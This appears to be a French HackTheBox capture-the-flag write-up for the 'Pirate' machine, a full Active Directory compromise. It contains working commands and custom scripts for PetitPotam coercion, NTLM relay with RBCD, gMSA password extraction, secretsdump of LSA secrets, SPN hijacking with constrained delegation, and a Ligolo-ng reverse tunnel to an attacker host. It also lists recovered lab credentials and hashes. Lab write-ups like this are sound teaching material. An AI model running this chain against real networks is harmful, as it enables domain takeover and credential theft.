# Pirate - WriteUp Complet
> **OS:** Windows Server 2019 | **Difficulté:** Hard | **IP:** 10.129.15.19 | **Domain:** pirate.htb

---

## Phase 1 - Reconnaissance

### Pourquoi commencer par un scan de ports ?
Sur une machine Windows Hard, on s'attend à un environnement Active Directory. Le scan révèle les services qui déterminent notre surface d'attaque.

### Scan de ports
```bash
nmap -Pn -p- --min-rate 5000 10.129.15.19
nmap -Pn -sCV -p 53,80,88,135,389,445,636,3268,5985,9389 10.129.15.19
```

**Résultats clés :**
| Port | Service | Info |
|---|---|---|
| 53 | DNS | Simple DNS Plus |
| 80 | HTTP | IIS 10.0 (page par défaut) |
| 88 | Kerberos | → confirme AD |
| 389/636 | LDAP/S | Domain: pirate.htb |
| 445 | SMB | Signing: **Required** |
| 5985 | WinRM | Remote management |
| 2179 | vmrdp | Hyper-V (indice réseau interne) |

**Réflexion :** C'est un **Domain Controller** (DC01.pirate.htb). Le port 2179 (Hyper-V vmrdp) est un indice crucial : le DC héberge probablement des VMs sur un réseau interne. Le SMB signing est required → pas de relay direct sur le DC.

### Validation des credentials
```bash
nxc smb 10.129.15.19 -u 'pentest' -p 'p3nt3st2025!&'
# [+] pirate.htb\pentest:p3nt3st2025!&
```

### Clock Skew
```bash
# Le DC a +7h de décalage - critique pour Kerberos
# Utiliser faketime pour toutes les opérations Kerberos
faketime -f '+7h' <commande>
```

**Pourquoi c'est important ?** Kerberos refuse les tickets si le décalage horaire dépasse 5 minutes. Sans `faketime`, toutes les opérations Kerberos échoueront avec `KRB_AP_ERR_SKEW`.

---

## Phase 2 - Enumération AD

### Pourquoi énumérer en profondeur ?
Avec des credentials domain, on peut cartographier tout l'AD : users, groupes, permissions, délégations, ADCS. C'est cette cartographie qui révèle les chemins d'attaque.

### Enumération LDAP - Users
```bash
ldapsearch -x -H ldap://10.129.15.19 -D 'pentest@pirate.htb' -w 'p3nt3st2025!&' \
  -b 'DC=pirate,DC=htb' '(objectClass=user)' \
  sAMAccountName memberOf description userAccountControl
```

**Users découverts :**
| User | Groupes | UAC | Notes |
|---|---|---|---|
| Administrator | Domain Admins | 66048 | Cible finale |
| a.white | Domain Users | 66048 | Angela White |
| a.white_adm | **IT** | **16843264** | TRUSTED_TO_AUTH_FOR_DELEGATION, SPN: ADFS/a.white |
| j.sparrow | Domain Users | 66048 | Jack Sparrow |
| pentest | Domain Users | 66048 | Notre user |

**Comptes machine intéressants :**
| Account | Groupes | UAC | Notes |
|---|---|---|---|
| MS01$ | **Domain Secure Servers** | **4128** | PASSWD_NOTREQD, Pre-Win2000 |
| EXCH01$ | Pre-Win2000 | **4128** | PASSWD_NOTREQD |
| WEB01$ | Domain Computers | 4096 | SPNs HTTP, tapinego |

**gMSA (Group Managed Service Accounts) :**
| Account | Groupes | Notes |
|---|---|---|
| gMSA_ADCS_prod$ | **Remote Management Users** | Service ADCS |
| gMSA_ADFS_prod$ | **Remote Management Users** | SPN: host/adfs.pirate.htb |

### Pourquoi MS01$ et EXCH01$ sont intéressants ?
`userAccountControl: 4128` = WORKSTATION_TRUST_ACCOUNT (4096) + **PASSWD_NOTREQD** (32). Combiné avec l'appartenance au groupe **Pre-Windows 2000 Compatible Access**, ces comptes ont probablement un **mot de passe = nom de machine en lowercase**.

### BloodHound
```bash
faketime -f '+7h' bloodhound-python -u 'pentest' -p 'p3nt3st2025!&' \
  -d pirate.htb -ns 10.129.15.19 -c All --zip
```

**Chemins d'attaque identifiés :**
```
a.white --[ForceChangePassword]--> a.white_adm
IT group --[WriteSPN]--> DC01$, WEB01$, MS01$, EXCH01$
a.white_adm --[Constrained Delegation]--> HTTP/WEB01.pirate.htb
Domain Secure Servers --[ReadGMSAPassword]--> gMSA_ADCS_prod$, gMSA_ADFS_prod$
```

### Kerberoast
```bash
faketime -f '+7h' impacket-GetUserSPNs 'pirate.htb/pentest:p3nt3st2025!&' \
  -dc-ip 10.129.15.19 -request -outputfile kerberoast.txt
```
Hash récupéré pour `a.white_adm` (SPN: ADFS/a.white) mais **non cracké** avec rockyou + rules. Le password est trop fort.

### ADCS
```bash
faketime -f '+7h' certipy find -u 'pentest@pirate.htb' -p 'p3nt3st2025!&' \
  -dc-ip 10.129.15.19 -stdout
```
- CA: `pirate-DC01-CA` sur DC01
- Template **ADFSSSLSigning** : EnrolleeSuppliesSubject=True, EKU=Server Auth, Enroll=**Domain Computers**
- MachineAccountQuota: **10**

---

## Phase 3 - Pre-Windows 2000 → gMSA → WinRM sur DC

### Pourquoi tester les comptes Pre-Win2000 ?
C'est une faille classique en AD. Quand un admin crée un compte machine en mode "Pre-Windows 2000 compatible", le password par défaut est le nom de la machine en lowercase sans le `$`. Si personne ne l'a changé, on a les creds.

### Test des credentials machines
```bash
nxc smb 10.129.15.19 -u 'MS01$' -p 'ms01'
# STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT → password CORRECT !

nxc smb 10.129.15.19 -u 'EXCH01$' -p 'exch01'
# STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT → password CORRECT !
```

**Pourquoi `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` = succès ?** Cette erreur signifie que l'authentification a réussi mais que le type de compte (WORKSTATION_TRUST) n'est pas autorisé pour un logon SMB interactif. Le password est validé.

### Pourquoi MS01$ est critique ?
`MS01$` est dans le groupe **Domain Secure Servers** qui a le droit **ReadGMSAPassword** sur `gMSA_ADCS_prod$` et `gMSA_ADFS_prod$`. Ces gMSA sont dans **Remote Management Users** → WinRM sur le DC.

### Lecture du gMSA via Kerberos

**Problème :** Les comptes WORKSTATION_TRUST ne peuvent pas faire de simple LDAP bind (erreur 710). Il faut utiliser **Kerberos**.

```bash
# Obtenir un TGT pour MS01$
faketime -f '+7h' impacket-getTGT 'pirate.htb/MS01$:ms01' -dc-ip 10.129.15.19
export KRB5CCNAME=MS01\$.ccache

# Lire le gMSA password via bloodyAD en Kerberos
faketime -f '+7h' bloodyAD -d pirate.htb -u 'MS01$' -p 'ms01' \
  --host DC01.pirate.htb -k get object 'gMSA_ADCS_prod$' --attr msDS-ManagedPassword
# msDS-ManagedPassword.NT: 25c7f0eb586ed3a91375dbf2f6e4a3ea

faketime -f '+7h' bloodyAD -d pirate.htb -u 'MS01$' -p 'ms01' \
  --host DC01.pirate.htb -k get object 'gMSA_ADFS_prod$' --attr msDS-ManagedPassword
# msDS-ManagedPassword.NT: fd9ea7ac7820dba5155bd6ed2d850c09
```

### WinRM sur le DC
```bash
evil-winrm -i 10.129.15.19 -u 'gMSA_ADCS_prod$' -H '25c7f0eb586ed3a91375dbf2f6e4a3ea'
```

**On est sur le DC !** Mais en tant que gMSA, pas admin. Medium Plus integrity, pas de SeDebugPrivilege.

### Découverte du réseau interne
```powershell
ipconfig /all
# Ethernet adapter vEthernet (Switch01):
#   IPv4 Address: 192.168.100.1
# Ethernet adapter Ethernet0 2:
#   IPv4 Address: 10.129.15.19
```

**Le DC est dual-homed !** Interface interne `192.168.100.1` (Hyper-V). WEB01 est sur ce subnet.

---

## Phase 4 - Pivot réseau interne avec Ligolo-ng

### Pourquoi Ligolo-ng ?
On doit accéder au réseau interne 192.168.100.0/24 depuis notre machine. Ligolo-ng crée un tunnel VPN-like performant via un agent sur le DC.

### Setup Ligolo-ng
```bash
# Sur notre machine - créer l'interface TUN
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.100.0/24 dev ligolo

# Lancer le proxy
./ligolo-ng_proxy_0.8.3_linux_amd64 -selfcert -laddr 0.0.0.0:11601
```

### Upload et lancement de l'agent sur le DC
```powershell
# Dans evil-winrm
upload /tmp/ligolo-ng_agent_0.8.3_windows_amd64.exe C:\temp\agent.exe
C:\temp\agent.exe -connect 10.10.17.198:11601 -ignore-cert
```

### Activation du tunnel
```
# Dans la console Ligolo
session
# Sélectionner l'agent DC01
start
```

**ATTENTION :** Si l'agent se reconnecte, la route disparaît. Il faut la remettre :
```bash
sudo ip route add 192.168.100.0/24 dev ligolo
```

### Scan du réseau interne
```bash
nmap -Pn -p 445,80,135,5985 192.168.100.0/24
# 192.168.100.1 → DC01 (déjà connu)
# 192.168.100.2 → WEB01 (HTTP:80, SMB:445, WinRM:5985)
```

### Vérification SMB signing
```bash
nxc smb 192.168.100.2
# (signing:False) → PARFAIT pour le relay NTLM !
```

---

## Phase 5 - NTLM Relay + RBCD sur WEB01

### Pourquoi le relay NTLM ?
WEB01 a SMB signing **disabled**. On peut forcer WEB01 à s'authentifier (coercion) puis relayer cette auth vers le LDAP du DC pour effectuer des actions en tant que WEB01$.

### Pourquoi Shadow Credentials a échoué ?
```
[-] Could not modify object, the server reports insufficient rights
```
WEB01$ n'a pas le droit de modifier son propre `msDS-KeyCredentialLink` via relay LDAP. **Mais RBCD fonctionne** car WEB01$ peut écrire `msDS-AllowedToActOnBehalfOfOtherIdentity` sur lui-même.

### Setup de l'attaque

**Terminal 1 - ntlmrelayx** (arrêter Responder d'abord) :
```bash
sudo impacket-ntlmrelayx -t ldap://192.168.100.1 --remove-mic \
  --delegate-access -smb2support
```

**Pourquoi `--remove-mic` ?** Le Message Integrity Code (MIC) protège normalement contre le relay. Ce flag le supprime pour permettre le relay LDAP.

**Pourquoi `--delegate-access` ?** ntlmrelayx va automatiquement :
1. Créer un nouveau compte machine
2. Configurer RBCD sur WEB01$ pour que ce compte puisse impersonner des users

**Terminal 2 - PetitPotam** (coercion) :
```bash
python3 PetitPotam.py -d pirate.htb -u pentest -p 'p3nt3st2025!&' \
  10.10.17.198 192.168.100.2
```

**Résultat :**
```
[+] Attack worked!
[*] Authenticating against ldap://192.168.100.1 as PIRATE/WEB01$ SUCCEED
[*] Adding new computer with username: LPQQLPUC$ and password: eCWqO6GJrjvDqy} result: OK
[*] Delegation rights modified succesfully!
[*] LPQQLPUC$ can now impersonate users on WEB01$ via S4U2Proxy
```

### S4U2Proxy → Admin local WEB01
```bash
# Obtenir un ticket CIFS/WEB01 en tant qu'Administrator
faketime -f '+7h' impacket-getST -spn 'cifs/WEB01.pirate.htb' \
  -impersonate Administrator -dc-ip 192.168.100.1 \
  'pirate.htb/LPQQLPUC$:eCWqO6GJrjvDqy}'

# Ajouter WEB01 au hosts
echo '192.168.100.2 WEB01.pirate.htb WEB01' | sudo tee -a /etc/hosts

# SYSTEM shell ou dump secrets
export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
faketime -f '+7h' impacket-smbexec -k -no-pass 'pirate.htb/Administrator@WEB01.pirate.htb'
```

### Dump des secrets WEB01
```bash
faketime -f '+7h' impacket-secretsdump -k -no-pass \
  'pirate.htb/Administrator@WEB01.pirate.htb' -use-vss
```

**Résultat critique dans les LSA Secrets :**
```
[*] DefaultPassword
PIRATE\a.white:E2nvAOKSz5Xz2MJu
```

**Pourquoi DefaultPassword ?** WEB01 est configuré avec un autologon Windows pour `a.white`. Le password est stocké en clair dans le registre `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword` et extrait par secretsdump via les LSA Secrets.

---

## Phase 6 - a.white → a.white_adm → Domain Admin

### ForceChangePassword
```bash
# Valider les creds de a.white
nxc smb 10.129.15.19 -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' -d pirate.htb

# a.white a ForceChangePassword sur a.white_adm (vu dans BloodHound)
source /etc/Certipy/certipy-venv/bin/activate
bloodyAD -d pirate.htb -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' \
  --host 10.129.15.19 set password 'a.white_adm' 'Hacked123!'
# [+] Password changed successfully!
```

**Pourquoi ForceChangePassword ?** Cet ACL AD permet de reset le password d'un user sans connaître l'ancien. C'est différent de "Change Password" qui nécessite l'ancien password.

### SPN Hijacking

**Rappel de la situation :**
- `a.white_adm` a **Constrained Delegation** vers `HTTP/WEB01.pirate.htb`
- `a.white_adm` est dans le groupe **IT** qui a **WriteSPN** sur DC01$

**L'idée :** Déplacer le SPN `HTTP/WEB01.pirate.htb` de WEB01$ vers DC01$. Quand on demandera un ticket via KCD pour ce SPN, le KDC chiffrera le ticket avec la clé de **DC01$** (puisque le SPN est maintenant sur DC01). On pourra ensuite réécrire le service en `CIFS/DC01.pirate.htb` et le DC acceptera le ticket.

### Script de SPN Hijacking
```python
#!/usr/bin/env python3
"""spn_hijack.py - Move HTTP/WEB01.pirate.htb from WEB01$ to DC01$"""

import ldap3

server = ldap3.Server('ldap://10.129.15.19')
conn = ldap3.Connection(server, 'pirate.htb\\a.white_adm', 'Hacked123!',
                        authentication=ldap3.NTLM, auto_bind=True)
print(f'[+] Bound as: {conn.extend.standard.who_am_i()}')

# Remove HTTP/WEB01.pirate.htb from WEB01$
conn.modify('CN=WEB01,CN=Computers,DC=pirate,DC=htb',
    {'servicePrincipalName': [(ldap3.MODIFY_DELETE, ['HTTP/WEB01.pirate.htb'])]})
print(f'[*] Remove SPN from WEB01$: {conn.result["description"]}')

# Remove HTTP/WEB01 too (short form)
conn.modify('CN=WEB01,CN=Computers,DC=pirate,DC=htb',
    {'servicePrincipalName': [(ldap3.MODIFY_DELETE, ['HTTP/WEB01'])]})
print(f'[*] Remove SPN HTTP/WEB01 from WEB01$: {conn.result["description"]}')

# Add HTTP/WEB01.pirate.htb to DC01$
conn.modify('CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb',
    {'servicePrincipalName': [(ldap3.MODIFY_ADD, ['HTTP/WEB01.pirate.htb'])]})
print(f'[*] Add SPN to DC01$: {conn.result["description"]}')
```

```bash
python3 spn_hijack.py
# [+] Bound as: u:PIRATE\a.white_adm
# [*] Remove SPN from WEB01$: success
# [*] Remove SPN HTTP/WEB01 from WEB01$: success
# [*] Add SPN to DC01$: success
```

### KCD + Alt-Service → Domain Admin
```bash
# 1. Obtenir un TGT frais pour a.white_adm
faketime -f '+7h' impacket-getTGT 'pirate.htb/a.white_adm:Hacked123!' -dc-ip 10.129.15.19

# 2. S4U2Self + S4U2Proxy avec alt-service
export KRB5CCNAME=a.white_adm.ccache
faketime -f '+7h' impacket-getST \
  -spn 'HTTP/WEB01.pirate.htb' \
  -impersonate Administrator \
  -dc-ip 10.129.15.19 \
  -k -no-pass \
  -altservice 'CIFS/DC01.pirate.htb' \
  'pirate.htb/a.white_adm'
# [*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache

# 3. SYSTEM shell sur le DC
export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
faketime -f '+7h' impacket-psexec -k -no-pass 'pirate.htb/Administrator@DC01.pirate.htb'
```

**Pourquoi `-altservice` ?** Le ticket S4U2Proxy est chiffré avec la clé du service cible. Puisqu'on a déplacé le SPN `HTTP/WEB01.pirate.htb` sur DC01$, le ticket est chiffré avec la clé de DC01$. En réécrivant le nom de service en `CIFS/DC01.pirate.htb`, le DC accepte le ticket car :
1. Il est chiffré avec sa propre clé (valide)
2. Le nom de service CIFS est accepté pour l'accès fichier/admin
3. Le ticket impersonne Administrator → **SYSTEM !**

### Root Flag
```cmd
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
785f845ea1967d0c434cd350f1468ad1
```

---

## Kill Chain Visuel

```
┌─────────────────────────────────────────┐
│ pentest (Domain User)                   │
│ p3nt3st2025!&                           │
└──────────────────┬──────────────────────┘
                   │ Pre-Windows 2000
                   │ password = machine name
┌──────────────────▼──────────────────────┐
│ MS01$ (password: ms01)                  │
│ Groupe: Domain Secure Servers           │
└──────────────────┬──────────────────────┘
                   │ ReadGMSAPassword
                   │ (via Kerberos TGT + bloodyAD -k)
┌──────────────────▼──────────────────────┐
│ gMSA_ADCS_prod$                         │
│ NTLM: 25c7f0eb586ed3a91375dbf2f6e4a3ea │
│ Remote Management Users → WinRM DC01   │
└──────────────────┬──────────────────────┘
                   │ evil-winrm → ipconfig
                   │ Découverte 192.168.100.0/24
┌──────────────────▼──────────────────────┐
│ Ligolo-ng Pivot                         │
│ Agent sur DC01 → Tunnel vers interne    │
│ WEB01 découvert à 192.168.100.2         │
│ SMB signing: DISABLED                   │
└──────────────────┬──────────────────────┘
                   │ PetitPotam coercion
                   │ + ntlmrelayx → LDAP relay
                   │ + RBCD (delegate-access)
┌──────────────────▼──────────────────────┐
│ WEB01$ - RBCD configuré                 │
│ LPQQLPUC$ → S4U2Proxy → Admin WEB01    │
│ secretsdump -use-vss                    │
│ LSA Secret: a.white:E2nvAOKSz5Xz2MJu   │
└──────────────────┬──────────────────────┘
                   │ ForceChangePassword
┌──────────────────▼──────────────────────┐
│ a.white_adm (IT group)                  │
│ Constrained Delegation: HTTP/WEB01      │
│ IT → WriteSPN sur DC01$                 │
└──────────────────┬──────────────────────┘
                   │ SPN Hijacking
                   │ HTTP/WEB01 → move to DC01$
                   │ KCD + altservice → CIFS/DC01
┌──────────────────▼──────────────────────┐
│ DOMAIN ADMIN                            │
│ psexec → SYSTEM on DC01                 │
│ root.txt: 785f845ea1967d0c434cd350...   │
└─────────────────────────────────────────┘
```

---

## Scripts Custom

### gmsa_dump.py
```python
#!/usr/bin/env python3
"""Read gMSA passwords using MS01$ machine account via NTLM auth"""

import ldap3
import hashlib
import struct

DC_IP = '10.129.15.19'
DOMAIN = 'pirate.htb'
USERNAME = 'MS01$'
PASSWORD = 'ms01'

def extract_ntlm_from_managed_password(blob):
    """Extract NTLM hash from msDS-ManagedPassword blob"""
    current_pwd_offset = struct.unpack('<H', blob[8:10])[0]
    pwd_bytes = blob[current_pwd_offset:current_pwd_offset + 256]
    ntlm = hashlib.new('md4', pwd_bytes).hexdigest()
    return ntlm

try:
    print(f"[*] Connecting to LDAP {DC_IP} as {DOMAIN}\\{USERNAME} via NTLM...")
    server = ldap3.Server(f'ldap://{DC_IP}', get_info=ldap3.ALL)
    conn = ldap3.Connection(server, user=f'{DOMAIN}\\{USERNAME}', password=PASSWORD,
                            authentication=ldap3.NTLM, auto_bind=True)
    print(f"[+] Connected! Bound as: {conn.extend.standard.who_am_i()}")

    conn.search('DC=pirate,DC=htb',
        '(objectClass=msDS-GroupManagedServiceAccount)',
        attributes=['sAMAccountName', 'msDS-ManagedPassword'])

    for entry in conn.entries:
        name = entry.sAMAccountName.value
        print(f"\n[+] Account: {name}")
        try:
            pwd_blob = entry['msDS-ManagedPassword'].raw_values[0]
            if pwd_blob:
                ntlm = extract_ntlm_from_managed_password(pwd_blob)
                print(f"[+] NTLM Hash: {ntlm}")
        except Exception as e:
            print(f"[-] Cannot read msDS-ManagedPassword: {e}")
except Exception as e:
    print(f"[-] Error: {e}")
```

**Note :** Ce script fonctionne en NTLM auth. Pour les comptes WORKSTATION_TRUST qui refusent le simple bind LDAP, utiliser plutôt bloodyAD avec Kerberos (`-k`) comme montré dans le writeup.

### spn_hijack.py
```python
#!/usr/bin/env python3
"""SPN Hijacking - Move HTTP/WEB01.pirate.htb from WEB01$ to DC01$"""

import ldap3

server = ldap3.Server('ldap://10.129.15.19')
conn = ldap3.Connection(server, 'pirate.htb\\a.white_adm', 'Hacked123!',
                        authentication=ldap3.NTLM, auto_bind=True)
print(f'[+] Bound as: {conn.extend.standard.who_am_i()}')

# Remove HTTP/WEB01.pirate.htb from WEB01$
conn.modify('CN=WEB01,CN=Computers,DC=pirate,DC=htb',
    {'servicePrincipalName': [(ldap3.MODIFY_DELETE, ['HTTP/WEB01.pirate.htb'])]})
print(f'[*] Remove SPN from WEB01$: {conn.result["description"]}')

# Remove HTTP/WEB01 too
conn.modify('CN=WEB01,CN=Computers,DC=pirate,DC=htb',
    {'servicePrincipalName': [(ldap3.MODIFY_DELETE, ['HTTP/WEB01'])]})
print(f'[*] Remove SPN HTTP/WEB01 from WEB01$: {conn.result["description"]}')

# Add HTTP/WEB01.pirate.htb to DC01$
conn.modify('CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb',
    {'servicePrincipalName': [(ldap3.MODIFY_ADD, ['HTTP/WEB01.pirate.htb'])]})
print(f'[*] Add SPN to DC01$: {conn.result["description"]}')
```

### bloodhound_parser.py
```python
#!/usr/bin/env python3
"""Parse BloodHound JSON to find attack paths without the GUI"""

import json
import sys

files = sys.argv[1:] or [
    'users.json', 'computers.json', 'groups.json',
    'domains.json', 'containers.json', 'ous.json',
]

# Build SID → name map
sid_map = {}
for fpath in files:
    try:
        with open(fpath) as f:
            data = json.load(f)
        for item in data.get('data', []):
            sid = item.get('ObjectIdentifier', '')
            name = item.get('Properties', {}).get('name', '')
            if sid and name:
                sid_map[sid] = name
    except:
        continue

# Dump ALL non-inherited, non-admin ACEs
for fpath in files:
    try:
        with open(fpath) as f:
            data = json.load(f)
        for item in data.get('data', []):
            target = item.get('Properties', {}).get('name', 'UNKNOWN')
            for ace in item.get('Aces', []):
                right = ace.get('RightName', '')
                inh = ace.get('IsInherited', False)
                psid = ace.get('PrincipalSID', '')
                pname = sid_map.get(psid, psid)
                if not inh and 'ADMIN' not in pname.upper() \
                   and 'DOMAIN ADMIN' not in pname.upper():
                    print(f'{pname} --[{right}]--> {target}')
    except:
        continue
```

---

## Leçons apprises

1. **Pre-Windows 2000 = creds gratuites** - Les comptes machines créés en mode compatible ont password = nom machine. Toujours tester avec `nxc smb` même si le logon SMB échoue (STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT = password correct).

2. **Les comptes machines ont des droits différents via Kerberos** - Simple LDAP bind refuse les WORKSTATION_TRUST (erreur 710). Kerberos bypass cette restriction → `impacket-getTGT` + `bloodyAD -k`.

3. **gMSA = pivot latéral** - Les gMSA dans Remote Management Users donnent WinRM sur le DC. Toujours vérifier qui peut lire `msDS-ManagedPassword`.

4. **DC dual-homed = réseau interne** - Le port 2179 (Hyper-V) était l'indice. `ipconfig /all` révèle le subnet interne. Ligolo-ng pour pivoter.

5. **SMB signing disabled = relay** - ntlmrelayx avec `--remove-mic` pour LDAP relay. `--delegate-access` pour RBCD automatique quand Shadow Credentials échoue.

6. **DefaultPassword dans les LSA Secrets** - Windows autologon stocke le password en clair dans le registre. `secretsdump -use-vss` l'extrait.

7. **ForceChangePassword ≠ Change Password** - Pas besoin de l'ancien password. bloodyAD le gère parfaitement.

8. **SPN Hijacking + KCD = Domain Admin** - Si on a WriteSPN sur un objet ET un compte avec Constrained Delegation, on peut déplacer le SPN cible et utiliser `-altservice` pour obtenir un ticket chiffré avec la clé du DC.

9. **La route Ligolo disparaît à chaque reconnexion de l'agent** - Toujours re-ajouter `sudo ip route add 192.168.100.0/24 dev ligolo`.

10. **BloodHound est indispensable** - Sans la cartographie ACL, on n'aurait jamais trouvé ForceChangePassword et WriteSPN. Même le parser JSON custom suffit quand la GUI n'est pas dispo.

## Credentials récupérées
| Account | Type | Credential |
|---|---|---|
| pentest | Password | p3nt3st2025!& |
| MS01$ | Password | ms01 |
| EXCH01$ | Password | exch01 |
| gMSA_ADCS_prod$ | NTLM | 25c7f0eb586ed3a91375dbf2f6e4a3ea |
| gMSA_ADFS_prod$ | NTLM | fd9ea7ac7820dba5155bd6ed2d850c09 |
| a.white | Password | E2nvAOKSz5Xz2MJu |
| a.white_adm | Password | Hacked123! (reset) |
| WEB01$ local Admin | NTLM | b1aac1584c2ea8ed0a9429684e4fc3e5 |
| LPQQLPUC$ | Password | eCWqO6GJrjvDqy} |

## Flags
- **User:** (sur WEB01)
- **Root:** 785f845ea1967d0c434cd350f1468ad1
